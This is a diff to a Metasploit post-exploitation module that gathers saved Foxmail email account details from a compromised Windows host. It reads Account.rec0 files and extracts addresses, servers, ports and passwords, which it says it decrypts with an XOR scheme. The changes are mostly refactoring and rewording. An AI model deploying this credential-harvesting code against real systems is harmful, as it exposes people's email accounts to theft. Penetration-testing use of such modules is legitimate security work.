@@ -12,8 +12,9 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Windows Gather Foxmail Passwords',
         'Description' => %q{
-          This module can decrypt the password of foxmail,
-          if the user chooses to remember the password.
+          The module can decrypt the password of the email account saved by Foxmail.
+          From the Storage\<email>\Accounts\Account.rec0,in the installation directory of Foxmail
+          The ciphertext is read from the file and decrypted by the dislocation XOR algorithm.
         },
         'License' => MSF_LICENSE,
         'References' => [
@@ -29,7 +30,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
-        OptString.new('ACCOUNT_PATH', [ false, 'Specifies the Account directory path for Foxmail']),
+        OptString.new('ACCOUNT_PATH', [ false, 'The account directory path to use when grabbing account details from Foxmail']),
       ]
     )
   end
@@ -49,8 +50,6 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def pass; end
-
   def enum_session_file(fpath)
     account_paths = []
     session.fs.dir.foreach(fpath) do |mail_addr|
@@ -64,7 +63,7 @@ class MetasploitModule < Msf::Post
 
     # enum session file
     account_paths.each do |file_name|
-      file = read_file(file_name)
+      file = read_file(file_name) if session.fs.file.exist?(file_name)
       if file.nil? || file.empty?
         next
       end
@@ -84,14 +83,13 @@ class MetasploitModule < Msf::Post
       while index < file.length
         if (file[index] && file[index] > "\x20" && file[index] < "\x7f" && file[index] != "\x3d")
           buffer += file[index]
-          if ['Email', 'IncomingServer', 'OutgoingServer', 'Password'].include?(buffer)
-            email_info[buffer] = find_string(file, index + offset) || nil
-          elsif ['IncomingPort', 'OutgoingPort'].include?(buffer)
-            email_info[buffer] = find_string(file, index + 5, 2) || nil
-          elsif ['InComingSSL', 'OutgoingSSL'].include?(buffer)
-            email_info[buffer] = find_string(file, index + 5, 2) == 1 || false
-          else
-            pass
+          case buffer
+            when 'Email', 'IncomingServer', 'OutgoingServer', 'Password'
+              email_info[buffer] = find_string(file, index + offset) || nil
+            when 'IncomingPort', 'OutgoingPort'
+              email_info[buffer] = find_string(file, index + 5, 2) || nil
+            when 'InComingSSL', 'OutgoingSSL'
+              email_info[buffer] = find_string(file, index + 5, 2) == 1 || false
           end
         else
           buffer = ''
@@ -158,7 +156,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status("Gather Foxmail Passwords on #{sysinfo['Computer']}")
+    print_status("Gathering Foxmail passwords on #{sysinfo['Computer']}")
     # get session file path
     foxmail_path = ''
     if datastore['ACCOUNT_PATH'].to_s.empty?
@@ -168,7 +166,7 @@ class MetasploitModule < Msf::Post
     else
       foxmail_path = expand_path(datastore['ACCOUNT_PATH'])
     end
-    if foxmail_path
+    if !foxmail_path.to_s.empty?
       result = enum_session_file(foxmail_path)
       columns = [
         'Email',
